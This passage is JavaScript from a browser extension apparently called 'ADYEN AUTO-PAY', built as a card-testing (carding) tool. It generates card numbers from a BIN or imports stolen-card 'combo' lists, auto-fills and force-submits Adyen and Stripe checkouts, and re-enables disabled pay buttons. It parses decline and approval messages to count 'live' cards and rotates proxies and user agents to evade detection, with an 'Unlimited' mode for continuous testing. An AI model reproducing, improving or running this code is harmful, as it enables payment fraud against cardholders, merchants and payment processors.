      const text = document.body ? document.body.innerText.slice(0, 4000) : "";
      report("nono_dt", { tick: dt.newValue.tick, text: text });
      return;
    }

    const dbg = changes["nono_dbg"];
    if (dbg && dbg.newValue) {
      currentTick = dbg.newValue.tick;
      const inputs = Array.from(document.querySelectorAll("input")).map((i) => ({
        t: i.type, n: i.name || "", id: i.id || "",
        al: i.getAttribute("aria-label") || "",
        ac: i.getAttribute("autocomplete") || "",
        ft: i.getAttribute("data-fieldtype") || "",
        cls: (i.className || "").slice(0, 40),
        vis: !!(i.offsetWidth || i.offsetHeight)
      }));
      const txt = JSON.stringify({ url: location.href.slice(0, 140), inputs: inputs, total: document.querySelectorAll("input").length }).slice(0, 3000);
      report("nono_dbg", { tick: dbg.newValue.tick, text: txt });
    }

    const rsp = changes["nono_resp"];
    if (rsp && rsp.newValue && isTop) {
      const r = rsp.newValue;
      if (r.body && r.body.length > 4) {
        capturedResps.push({ at: (r && r.at) || Date.now(), url: r.url || "", status: 200, body: String(r.body) });
        if (capturedResps.length > 60) capturedResps.shift();
        const info = parseAdyenResp(r.body);
        if (info) {
          window.__nonoResult && window.__nonoResult("&#128269;",
            "RESP " + (info.resultCode || info.action || "?") +
            (info.refusalReason ? " | " + info.refusalReason : ""), "#c9b8ff");
        }
      }
    }

    const srsp = changes["stripe_resp"];
    if (srsp && srsp.newValue && isTop) {
      const r = srsp.newValue;
      if (r.body && r.body.length > 4) {
        capturedResps.push({ at: (r && r.at) || Date.now(), url: r.url || "", status: 200, body: String(r.body) });
        if (capturedResps.length > 60) capturedResps.shift();
        const info = parseStripeResp(r.body);
        if (info) {
          window.__nonoResult && window.__nonoResult("&#128225;",
            "RESP " + (info.decline ? info.decline + " " : "") + (info.code ? info.code + " " : "") +
            (info.message || info.status || info.action || "?"), "#c9b8ff");
        }
      }
    }
  });

  function adyenUISignal() {
    const now = Date.now();
    if (now - signalCache.adyenAt < 500) return signalCache.adyen;
    signalCache.adyenAt = now;
    signalCache.adyen = (function () {
      try {
        if (document.querySelector('[class*="adyen-checkout"], [data-testid*="payment-method"], [class*="adyen-modal"]')) return true;
        const f = Array.from(document.querySelectorAll("iframe")).some((x) =>
          /checkoutshopper|adyen/.test(x.src || ""));
        return f;
      } catch (e) { return false; }
    })();
    return signalCache.adyen;
  }

  let scanScheduled = false;
  let lastScanAt = 0;
  function scan() {
    if (pendingCard) {
      const r = fillOwned(pendingCard);
      report("nono_ff", { tick: currentTick, fields: r.fields, any: r.any });
    }
    if (!isTop) return;
    if (!modalStarted && (adyenUISignal() || stripeUISignal())) {
      modalStarted = true;
      if (!document.getElementById("nono-panel")) init();
      getConfig().then((cfg) => {
        if (cfg && cfg.autoOnLoad && !running && !stopRequested) {
          const b = document.getElementById("nono-start");
          if (b) {
            window.__nonoLog && window.__nonoLog("Adyen UI appeared — auto start.");
            b.click();
          }
        }
        if (cfg && cfg.autoInbuilt && window.__nonoInbuiltScan) {
          window.__nonoInbuiltScan();
        }
      });
    }
  }
  const observer = new MutationObserver(() => {
    if (scanScheduled) return;
    scanScheduled = true;
    requestAnimationFrame(() => {
      scanScheduled = false;
      const now = Date.now();
      if (now - lastScanAt < 300) return;
      lastScanAt = now;
      scan();
    });
  });
  observer.observe(document.documentElement || document, {
    childList: true, subtree: true
  });

  function ensureCardMethod() {
    const methods = Array.from(document.querySelectorAll(
      '.adyen-checkout__payment-method, [data-testid*="payment-method"], [class*="payment-method"]'
    ));
    for (const m of methods) {
      const txt = (m.innerText || "").toLowerCase();
      if (/card|credit|debit/.test(txt)) {
        m.click();
        return true;
      }
    }
    const btns = Array.from(document.querySelectorAll("button, label, div[role='button']"));
    for (const b of btns) {
      const t = (b.innerText || "").replace(/\s+/g, " ").trim().toLowerCase();
      if (/^(credit|debit)?\s*(card|pay by card)$/.test(t) && b.offsetParent) {
        b.click();
        return true;
      }
    }
    return false;
  }

  function fireClick(b) {
    if (!b) return;
    try { b.scrollIntoView({ block: "center", behavior: "instant" }); } catch (e) {}
    try { b.focus({ preventScroll: true }); } catch (e) {}
    const opts = { bubbles: true, cancelable: true, view: window, button: 0 };
    ["pointerdown", "mousedown", "pointerup", "mouseup", "click"].forEach((t) => {
      try {
        const Ctor = t.indexOf("pointer") === 0 ? PointerEvent : MouseEvent;
        b.dispatchEvent(new Ctor(t, opts));
      } catch (e) {
        try { b.dispatchEvent(new MouseEvent(t, { bubbles: true, cancelable: true })); } catch (e2) {}
      }
    });
    try { b.click(); } catch (e) {}
  }

  function payButtonScore(b) {
    let id = "", cls = "", testid = "", aria = "", typ = "";
    try {
      id = b.id || "";
      cls = (b.className && typeof b.className === "string" ? b.className : (b.className.baseVal || "")).toString() || "";
      testid = b.getAttribute("data-testid") || "";
      aria = b.getAttribute("aria-label") || "";
      typ = b.type || "";
    } catch (e) {}
    const text = (((b.innerText || b.value || "") + " " + aria).replace(/\s+/g, " ").trim()).toLowerCase();
    let s = 0;
    if (/hosted-payment-submit-button|hosted-payment-element/.test(id + " " + cls + " " + testid)) s += 100;
    else if (/adyen-checkout__button|SubmitButton|submit[-_]?button|pay[-_]?button|btn[-_]?pay|checkout-button/.test(cls + " " + testid + " " + id)) s += 80;
    else if (/pay|submit|confirm/.test(id)) s += 40;
    if (typ === "submit") s += 30;
    if (/^(pay|pay now|pay[ \t]+(\$|€|£|¥|\bsar\b|\begp\b|\bkwd\b|\bae[ds]\b|\bqar\b|\bdin\b|\bbhd\b|\bomr\b|\bijp\b|\btr\b)?[ \t]*[\d.,]+|submit( payment| order| card)?|proceed[ \t]+(to[ \t]+)?(pay|checkout|payment)|place[ \t]+order|confirm[ \t]+(order|payment|purchase|card)?|complete[ \t]+(order|purchase|payment)|buy[ \t]+now|pay[ \t]+with[ \t]+card|continue[ \t]+to[ \t]+pay)/i.test(text)) s += 60;
    else if (/pay|submit|confirm|place order|checkout|complete (order|purchase|payment)/.test(text)) s += 25;
    if (b.disabled) s -= 6;
    else if (aria === "false" || (!b.disabled && aria !== "true")) s += 4;
    return s;
  }

  function findPayButton() {
    const els = Array.from(document.querySelectorAll(
      "button, [role='button'], input[type='submit'], input[type='button']"
    ));
    let best = null;
    let bestScore = 0;
    for (const b of els) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      const s = payButtonScore(b);
      if (s > bestScore) { best = b; bestScore = s; }
    }
    return best;
  }

  function waitPayEnabled(timeout) {
    return new Promise((resolve) => {
      const start = Date.now();
      const timer = setInterval(() => {
        const btn = findPayButton();
        if (btn && !btn.disabled) {
          clearInterval(timer);
          resolve(btn);
        } else if (Date.now() - start > (timeout || 6000)) {
          clearInterval(timer);
          resolve(btn || null);
        }
      }, 400);
    });
  }

  function isProcessing() {
    try {
      const t = (document.body ? document.body.innerText : "").toLowerCase();
      if (/processing|redirecting|please wait|authoris|verifying|validating|submitting|sending|almost done|just a moment|holding on/.test(t)) return true;
      const btn = findPayButton();
      if (btn && btn.disabled) return true;
      if (document.querySelector("button.adyen-checkout__button[disabled], [class*='adyen-checkout__spinner'], [class*='spinner'][class*='pay'], [class*='adyen-checkout__payment-holder'][class*='spinner']")) return true;
    } catch (e) {}
    return false;
  }

  async function settleResultText(timeout) {
    const start = Date.now();
    while (Date.now() - start < (timeout || 2600)) {
      const t = (document.body ? document.body.innerText : "") || "";
      if (!/processing|please wait|connecting|just a moment/.test(t)) return;
      await sleep(400);
    }
  }

  function logButtons() {
    const out = [];
    const buttons = Array.from(document.querySelectorAll(
      "button, [role='button'], input[type='submit'], input[type='button'], a"
    ));
    for (const b of buttons.slice(0, 12)) {
      const rect = b.getBoundingClientRect();
      if (rect.width === 0 && rect.height === 0) continue;
      out.push({
        t: ((b.innerText || b.value || "").trim() || "").slice(0, 30),
        a: (b.getAttribute("aria-label") || "").slice(0, 30),
        c: (b.className || "").slice(0, 40),
        d: !!b.disabled,
        vis: rect.width > 0
      });
    }
    window.__nonoResult && window.__nonoResult("&#128269;",
      "BTNS " + JSON.stringify(out).slice(0, 700), "#8fa3b5");
  }

  function execPay() {
    return new Promise((resolve) => {
      try {
        chrome.runtime.sendMessage({ action: "FF_PAY" }, (res) => {
          if (chrome.runtime.lastError || !res) {
            resolve({ clicked: [], detected: false, submitting: false });
            return;
          }
          resolve(res);
        });
      } catch (e) {
        resolve({ clicked: [], detected: false, submitting: false });
      }
    });
  }

  async function tryPayHard(card) {
    const xp = await execPay();
    if (xp && xp.submitting) return true;
    await sleep(400);

    let ok = await submitClick(6);
    if (ok) return true;

    window.__nonoLog && window.__nonoLog("Pay not moving, waiting for enable...");
    const btn = await waitPayEnabled(8000);
    if (btn && !btn.disabled) {
      ok = await clickPayButton(btn);
      if (ok) return true;
    }

    const anyBtn = findPayButton();
    if (anyBtn) {
      if (anyBtn.disabled) {
        try { anyBtn.disabled = false; } catch (e) {}
        try { anyBtn.removeAttribute("disabled"); } catch (e) {}
        try { anyBtn.setAttribute("aria-disabled", "false"); } catch (e) {}
      }
      ok = await clickPayButton(anyBtn);
      if (ok) return true;
    }

    const adyenBtns = Array.from(document.querySelectorAll(".adyen-checkout__button, button[type='submit'], input[type='submit']"));
    for (const b of adyenBtns) {
      if (b === anyBtn) continue;
      if (b.disabled) {
        try { b.disabled = false; } catch (e) {}
        try { b.removeAttribute("disabled"); } catch (e) {}
      }
      ok = await clickPayButton(b);
      if (ok) return true;
    }

    const forms = Array.from(document.querySelectorAll("form"));
    for (const f of forms) {
      try {
        if (typeof f.requestSubmit === "function") {
          try { f.requestSubmit(); await sleep(1500); if (isProcessing()) return true; } catch (e) {}
        }
        f.dispatchEvent(new SubmitEvent("submit", { bubbles: true, cancelable: true }));
      } catch (e) {}
    }
    await sleep(1600);
    if (isProcessing()) return true;

    window.__nonoLog && window.__nonoLog("Pay click dead. Button inventory below 👇");
    logButtons();
    return false;
  }

  async function clickPayButton(btn) {
    if (!btn) return false;
    try { btn.scrollIntoView({ block: "center", behavior: "instant" }); } catch (e) {}
    fireClick(btn);
    await sleep(1500);
    if (isProcessing()) return true;
    try {
      if (btn.form && typeof btn.form.requestSubmit === "function") {
        btn.form.requestSubmit(btn);
        await sleep(1500);
        if (isProcessing()) return true;
      }
    } catch (e) {}
    return false;
  }

  async function submitClick(retries) {
    retries = retries == null ? 8 : retries;
    for (let i = 0; i < retries; i++) {
      const btn = findPayButton();
      if (btn) {
        fireClick(btn);
      }
      await sleep(1300);
      if (isProcessing()) return true;
      const liBtn = findPayButton();
      if (liBtn && liBtn.disabled === false && i < 2) {
        await sleep(800);
        continue;
      }
    }
    return false;
  }

  function topDocText() {
    return document.body ? (document.body.innerText || "").toLowerCase() : "";
  }

  function topDocHtml() {
    return document.documentElement ? document.documentElement.innerHTML : "";
  }

  function detectResult(texts) {
    const all = (topDocText() + " " + texts.join(" ")).toLowerCase();
    const html = topDocHtml();

    if (/adyen-checkout__threeds2/.test(html) ||
        (/3-?d\s*secure|3ds challenge|authenticate your|verification required|complete (verification|your payment|your purchase)|enter (the )?(sms|code|otp|one-?time)|submit the (code|otp)|please complete your 3\/(ds )?security|confirm (your )?(payment|purchase|verification)/.test(all) &&
         !/(declined|refused|failed|unable|unsuccessful|restricted|do not honor)/.test(all))) {
      return { ok: true, label: "3DS CHALLENGE" };
    }
    const good = [
      "thank you", "payment successful", "payment complete", "approved", "authorised", "authorized",
      "redirecting", "your payment was made",
      "payment succeeded", "success", "payment received",
      "thanks for your purchase", "your purchase has been completed", "payment complete"
    ];
    for (const g of good) {
      if (all.includes(g)) return { ok: true, label: "PROCESSED" };
    }
    const bad = [
      "declined", "refused", "invalid card number", "unsupported card", "expired",
      "not supported", "no sufficient", "insufficient", "invalid number",
      "cannot be used", "rejected", "failed", "do not honor",
      "card number is invalid", "security code is incorrect", "card expired",
      "payment not successful", "please try again", "card was declined",
      "your card has expired", "security code is incomplete", "cvc is incorrect",
      "incorrect cvc", "card has insufficient funds", "insufficient funds",
      "cannot authenticate", "could not be authenticated", "restart this payment",
      "card number is incorrect", "try again later"
    ];
    for (const b of bad) {
      if (all.includes(b)) return { ok: false, label: b.toUpperCase() };
    }
    return null;
  }

  function updateBinSpec() {
    const specEl = document.getElementById("nono-bin-spec");
    if (!specEl) return;
    const binEl = document.getElementById("nono-bin");
    const b = (binEl ? binEl.value : "").trim().replace(/[\s-]/g, "");
    if (!/^[0-9]{2,}$/.test(b)) {
      specEl.style.color = "#6b7b8d";
      specEl.textContent = "type a BIN to auto-detect brand/length/CVC";
      return;
    }
    if (!window.CardGen || !window.CardGen.cardSpec) {
      specEl.style.color = "#6b7b8d";
      specEl.textContent = "cardgen unavailable";
      return;
    }
    const spec = window.CardGen.cardSpec(b);
    const sample = window.CardGen.genNumber(b, spec.length);
    const luhn = window.CardGen.isValidLuhn(sample);
    const fullBIN = /^\d{6,}$/.test(b) ? "BIN " + b.slice(0, 6) : "";
    specEl.style.color = luhn ? "#00d1b2" : "#ff7d7d";
    specEl.textContent = (fullBIN ? fullBIN + " · " : "") + spec.label + " · " + spec.length + "-digit · CVC " + spec.cvcLen + " · Luhn " + (luhn ? "OK" : "ERR");
  }

  function buildPanel() {
    if (document.getElementById("nono-panel")) return;

    const panel = document.createElement("div");
    panel.id = "nono-panel";
    panel.style.cssText = [
      "position:fixed", "top:8px", "right:8px", "z-index:2147483647",
      "width:min(320px, calc(100vw - 16px))", "background:#0b0e13",
      "color:#e6e6e6", "font-family:Segoe UI, Roboto, sans-serif",
      "border:1px solid #1f2a33", "border-radius:14px", "padding:0",
      "box-shadow:0 12px 40px rgba(0,0,0,.65)", "font-size:12px",
      "user-select:none", "overflow:hidden", "transition:transform .28s ease,opacity .28s ease",
      "opacity:0", "transform:translateX(40px)", "max-height:calc(100vh - 16px)",
      "display:flex", "flex-direction:column"
    ].join(";");

    panel.innerHTML = `
      <div style="background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;padding:8px 12px;display:flex;justify-content:space-between;align-items:center">
        <div style="display:flex;align-items:center;gap:8px">
          <span style="font-size:16px">&#9889;</span>
          <b style="font-size:13px;letter-spacing:.5px">ADYEN AUTO-PAY</b>
          <span id="nono-ver" style="font-size:9px;background:#00110d33;color:#00110d;padding:2px 6px;border-radius:8px">1.12.9</span>
        </div>
        <div style="display:flex;gap:4px;align-items:center">
          <button id="nono-copy-log" title="Copy activity log to clipboard" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;padding:3px 6px;border-radius:6px;font-size:9px;line-height:1;font-weight:800">&#10697; LOG</button>
          <button id="nono-dbg" title="Debug DOM" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:10px;line-height:1;font-weight:700">DBG</button>
          <button id="nono-settings" title="Settings" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:24px;height:22px;border-radius:6px;font-size:13px;line-height:1">&#9881;</button>
          <button id="nono-min" title="Minimize" style="background:#00110d22;border:none;color:#00110d;cursor:pointer;width:22px;height:22px;border-radius:6px;font-size:12px;line-height:1">&#8211;</button>
        </div>
      </div>

      <div style="padding:12px;display:flex;flex-direction:column;gap:6px;overflow-y:auto;flex:1 1 auto;min-height:0">
        <div id="nono-bin-wrap" style="display:flex;gap:6px">
          <div style="flex:1">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">BIN</label>
            <input id="nono-bin" type="text" placeholder="4400661989645" maxlength="19" inputmode="numeric" autofocus
              style="width:100%;box-sizing:border-box;padding:9px;background:#131a22;color:#e6e6e6;border:1px solid #00d1b2;border-radius:8px;font-size:15px;outline:none;font-weight:700;letter-spacing:1px">
          </div>
        </div>
        <div id="nono-bin-spec" style="font-size:10px;color:#6b7b8d;min-height:14px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">type a BIN to auto-detect brand/length/CVC</div>

        <div style="display:flex;gap:6px;margin-top:2px">
          <button id="nono-start" style="flex:2;padding:12px;background:linear-gradient(135deg,#00d1b2,#00a88c);color:#00110d;border:none;border-radius:9px;font-weight:800;font-size:14px;cursor:pointer">&#9654; START</button>
          <button id="nono-stop" style="flex:1;padding:12px;background:#23303c;color:#ff6b6b;border:none;border-radius:9px;font-weight:800;font-size:14px;cursor:pointer">STOP</button>
        </div>

        <div style="display:flex;justify-content:space-between;font-size:11px;margin-top:2px">
          <span style="color:#00d1b2" id="nono-log">Ready, Chief.</span>
          <span style="color:#ffcc00" id="nono-count">Live: 0</span>
        </div>

        <div id="nono-results" style="max-height:180px;overflow-y:auto;font-size:11px;border-top:1px solid #1a2430;padding-top:6px"></div>

        <div id="nono-advanced" style="display:none;flex-direction:column;gap:6px;border-top:1px solid #1a2430;margin-top:4px;padding-top:8px">
          <div style="display:flex;gap:4px;margin-bottom:2px">
            <button id="nono-mode-bin" type="button" style="flex:1;padding:7px;background:#00d1b2;color:#00110d;border:none;border-radius:7px;font-size:11px;font-weight:800;cursor:pointer">BIN</button>
            <button id="nono-mode-combo" type="button" style="flex:1;padding:7px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer">COMBO</button>
          </div>
          <div id="nono-combo-wrap" style="display:flex;gap:6px;align-items:flex-end">
            <div style="flex:1">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Full Combo</label>
              <input id="nono-combo" type="text" placeholder="number|mm|yyyy|cvc|zip" inputmode="numeric"
                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
            </div>
            <div style="width:88px">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Card Len</label>
              <select id="nono-len" style="width:100%;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
                <option value="0">Auto</option>
                <option value="16">16</option>
                <option value="15">15</option>
                <option value="19">19</option>
              </select>
            </div>
          </div>
          <div style="display:flex;gap:6px;align-items:flex-end">
            <div style="flex:1">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Holder</label>
              <input id="nono-holder" type="text" placeholder="JOHN DOE" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
            </div>
            <div style="flex:1">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Email</label>
              <input id="nono-email" type="email" placeholder="auto" style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:12px;outline:none">
            </div>
          </div>
          <div id="nono-addr-wrap" style="display:flex;gap:6px">
            <div style="width:64px">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Country</label>
              <input id="nono-country" type="text" placeholder="US" maxlength="2" autocomplete="country-name"
                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none;text-transform:uppercase">
            </div>
            <div style="flex:1">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Zip</label>
              <input id="nono-postal" type="text" placeholder="auto by country" autocomplete="postal-code"
                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:13px;outline:none">
            </div>
          </div>

          <div style="display:flex;gap:6px;align-items:center;font-size:11px;margin-top:2px">
            <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
              <input type="checkbox" id="nono-autosubmit" style="width:auto;accent-color:#00d1b2"> Auto Submit
            </label>
            <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer">
              <input type="checkbox" id="nono-autoonload" style="width:auto;accent-color:#00d1b2"> Auto on Load
            </label>
            <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer" title="Keep scanning cards without stopping on each result">
              <input type="checkbox" id="nono-continuous" style="width:auto;accent-color:#ffcc00"> Unlimited
            </label>
          </div>

          <div style="margin-top:8px;border-top:1px solid #1a2430;padding-top:8px">
            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
              <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Combo File Import</label>
              <span id="nono-combo-count" style="font-size:9px;color:#00d1b2">0 combos</span>
            </div>
            <div style="display:flex;gap:6px">
              <label id="nono-upload-btn" style="flex:1;padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;text-align:center;font-weight:600">
                📁 Upload Combo File
              </label>
              <input type="file" id="nono-file-input" accept=".txt,.csv" style="display:none">
              <button id="nono-clear-combos" style="padding:8px;background:#23303c;color:#e6e6e6;border:none;border-radius:8px;font-size:11px;cursor:pointer;font-weight:600">Clear</button>
            </div>
            <div id="nono-combo-list" style="max-height:80px;overflow-y:auto;font-size:10px;margin-top:6px;border:1px solid #1a2430;border-radius:6px;background:#0a0d12;display:none">
            </div>
            <div style="font-size:9px;color:#46566a;margin-top:4px">Format: cardnumber|mm|yyyy|cvc (one per line)</div>
          </div>

          <div id="nono-proxy-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
            <span id="nono-proxy-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">Proxy: OFF</span>
            <button id="nono-proxy-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
            <button id="nono-proxy-test" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">TEST</button>
            <button id="nono-proxy-off" style="padding:6px 8px;background:#3a2230;color:#ff7d7d;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">OFF</button>
          </div>

          <div id="nono-ua-row" style="display:flex;gap:6px;align-items:center;margin-top:4px">
            <span id="nono-ua-label" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">UA: OFF</span>
            <button id="nono-ua-next" style="padding:6px 8px;background:#23303c;color:#e6e6e6;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">NEXT</button>
            <button id="nono-ua-toggle" style="padding:6px 8px;background:#23303c;color:#ffd166;border:none;border-radius:7px;font-size:10px;font-weight:700;cursor:pointer">ON/OFF</button>
          </div>

          <div id="nono-cs" style="display:flex;flex-direction:column;gap:6px;margin-top:4px">
            <label style="font-size:9px;text-transform:uppercase;color:#6b7b8d">Checkoutshopper URL / session</label>
            <textarea id="nono-cs-url" rows="3" spellcheck="false"
              placeholder="https://checkoutshopper-test.adyen.com/checkoutshopper/v1/sessions/{id}/setup?clientKey=test_...&#10;or paste the full curl with --data-raw {sessionData}"
              style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none;resize:vertical;font-family:monospace"></textarea>
            <div style="display:flex;gap:6px;align-items:center">
              <button id="nono-cs-pay" style="flex:1;padding:10px;background:linear-gradient(135deg,#2f8cff,#1b5fd8);color:#fff;border:none;border-radius:9px;font-weight:700;font-size:12px;cursor:pointer">&#9654; OPEN &amp; PAY</button>
              <span id="nono-cs-status" style="font-size:10px;color:#8fa3b5">sandbox only</span>
            </div>

            <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d141c;border:1px solid #1a2632;border-radius:9px">
              <div style="display:flex;gap:6px;align-items:center">
                <button id="nono-inbuilt-pay" style="flex:1;padding:9px;background:linear-gradient(135deg,#9b59b6,#6c3483);color:#fff;border:none;border-radius:8px;font-weight:700;font-size:11px;cursor:pointer">&#9678; EXTRACT INBUILT + PAY</button>
                <button id="nono-inbuilt-clear" title="Clear captured inbuilt session" style="padding:9px 10px;background:#3a2230;color:#ff7d7d;border:none;border-radius:8px;font-size:11px;font-weight:700;cursor:pointer">X</button>
              </div>
              <div style="display:flex;justify-content:space-between;align-items:center;gap:6px">
                <span id="nono-inbuilt-status" style="font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">waiting for embedded Adyen session…</span>
                <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px;flex-shrink:0">
                  <input type="checkbox" id="nono-autoinbuilt" style="width:auto;accent-color:#9b59b6"> Auto</label>
              </div>
            </div>

            <div style="display:flex;flex-direction:column;gap:6px;margin-top:4px;padding:8px;background:#0d1117;border:1px solid #2d3350;border-radius:9px">
              <div style="display:flex;align-items:center;gap:6px">
                <span style="font-size:11px;font-weight:800;color:#635bff;letter-spacing:.5px">STRIPE</span>
                <label style="display:flex;align-items:center;gap:4px;color:#8fa3b5;cursor:pointer;font-size:10px">
                  <input type="checkbox" id="nono-autostripe" style="width:auto;accent-color:#635bff"> Auto</label>
                <span id="nono-stripe-status" style="flex:1;font-size:10px;color:#8fa3b5;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">link / inbuilt mode</span>
              </div>
              <input id="nono-stripe-url" type="text" placeholder="https://buy.stripe.com/... (hosted payment link)"
                style="width:100%;box-sizing:border-box;padding:8px;background:#131a22;color:#e6e6e6;border:1px solid #23303c;border-radius:8px;font-size:11px;outline:none">
              <div style="display:flex;gap:6px;align-items:center">
                <button id="nono-stripe-open" style="flex:1;padding:8px 10px;background:linear-gradient(135deg,#635bff,#4f46e5);color:#fff;border:none;border-radius:8px;font-size:10px;font-weight:700;cursor:pointer">OPEN + HIT</button>
              </div>
            </div>
          </div>

          <div style="display:flex;justify-content:flex-end;margin-top:2px">
            <button id="nono-close" style="background:none;border:none;color:#5a6b7c;cursor:pointer;font-size:11px;padding:2px 6px;border-radius:6px">Remove</button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(panel);

    const pill = document.createElement("div");
    pill.id = "nono-pill";
    pill.style.cssText = [
      "position:fixed", "right:10px", "top:30%", "z-index:2147483647",
      "width:48px", "height:48px", "border-radius:14px",
      "background:linear-gradient(135deg,#00d1b2,#00a88c)", "color:#00110d",
      "display:none", "align-items:center", "justify-content:center",
      "font-size:20px", "cursor:pointer", "box-shadow:0 6px 20px rgba(0,0,0,.5)",
      "touch-action:none", "user-select:none", "flex-direction:column", "gap:0"
    ].join(";");
    pill.innerHTML = '<span style="line-height:1">&#9889;</span><span id="nono-pill-count" style="font-size:8px;font-weight:700;line-height:1">0</span>';
    document.body.appendChild(pill);

    const box = panel.querySelector("#nono-results");
    const log = panel.querySelector("#nono-log");
    const count = panel.querySelector("#nono-count");
    const pillCount = document.getElementById("nono-pill-count");

    setTimeout(() => {
      panel.style.opacity = "1";
      panel.style.transform = "translateX(0)";
    }, 40);

    function minimize() {
      panel.style.transform = "translateX(40px)";
      panel.style.opacity = "0";
      setTimeout(() => {
        panel.style.display = "none";
        pill.style.display = "flex";
      }, 280);
    }

    function restore() {
      pill.style.display = "none";
      panel.style.display = "flex";
      requestAnimationFrame(() => {
        panel.style.opacity = "1";
        panel.style.transform = "translateX(0)";
      });
    }

    let dragY = 0;
    let dragging = false;
    pill.addEventListener("pointerdown", (e) => {
      dragging = true;
      dragY = e.clientY - pill.offsetTop;
      pill.setPointerCapture(e.pointerId);
    });
    pill.addEventListener("pointermove", (e) => {
      if (!dragging) return;
      const y = e.clientY - dragY;
      const maxY = window.innerHeight - 56;
      pill.style.top = Math.min(Math.max(8, y), maxY) + "px";
    });
    pill.addEventListener("pointerup", (e) => {
      dragging = false;
      if (pill.hasPointerCapture && pill.hasPointerCapture(e.pointerId)) pill.releasePointerCapture(e.pointerId);
    });
    pill.addEventListener("click", () => {
      if (dragging) return;
      restore();
    });

    const el = (id) => panel.querySelector(id);
    comboListEl = el("#nono-combo-list");

    function savePanelState() {
      const cfg = {
        mode: cardSourceMode === "bin" ? "bin" : "combo",
        bin: el("#nono-bin").value.trim(),
        combo: el("#nono-combo").value.trim(),
        holder: el("#nono-holder").value.trim(),
        email: el("#nono-email") ? el("#nono-email").value.trim() : "",
        country: el("#nono-country") ? el("#nono-country").value.trim().toUpperCase().slice(0, 2) : "",
        postal: el("#nono-postal") ? el("#nono-postal").value.trim() : "",
        stripeUrl: el("#nono-stripe-url") ? el("#nono-stripe-url").value.trim() : "",
        cardLength: parseInt(el("#nono-len").value, 10) || 0,
        autoSubmit: el("#nono-autosubmit").checked,
        autoOnLoad: el("#nono-autoonload").checked,
        continuous: el("#nono-continuous").checked,
        autoInbuilt: el("#nono-autoinbuilt") ? el("#nono-autoinbuilt").checked : false,
        autoStripe: el("#nono-autostripe") ? el("#nono-autostripe").checked : false,
        enabled: true
      };
      setConfig(cfg);
      return cfg;
    }

    function logMsg(m) { log.textContent = m; pushLog(m); }
    function updateCount() {
      count.textContent = "Live: " + liveHits + " / " + tries;
      pillCount.textContent = String(liveHits);
    }
    function logResult(icon, text, color, mono) {
      pushLog(text);
      const line = document.createElement("div");
      line.style.cssText = "padding:3px 0;border-bottom:1px solid #141c26;color:" + (mono ? "#e6e6e6" : color) + ";white-space:nowrap;overflow:hidden;text-overflow:ellipsis;display:flex;gap:4px;align-items:center";
      line.innerHTML = '<span style="flex-shrink:0">' + icon + '</span><span style="overflow:hidden;text-overflow:ellipsis">' + text + '</span>';
      box.prepend(line);
      while (box.children.length > 12) box.lastChild.remove();
    }

    async function debugDump() {
      logMsg("Gathering frame inventory...");
      const tick = Date.now() + Math.floor(Math.random() * 1000);
      currentTick = tick;
      clearReports("nono_dbg");
      chrome.storage.local.set({ nono_dbg: { tick: tick } });
      await sleep(1400);
      const s = await summarize("nono_dbg");

      const iframes = Array.from(document.querySelectorAll("iframe")).map((f) => ({
        src: (f.src || "").slice(0, 130), title: f.title || "", w: f.offsetWidth, h: f.offsetHeight
      }));
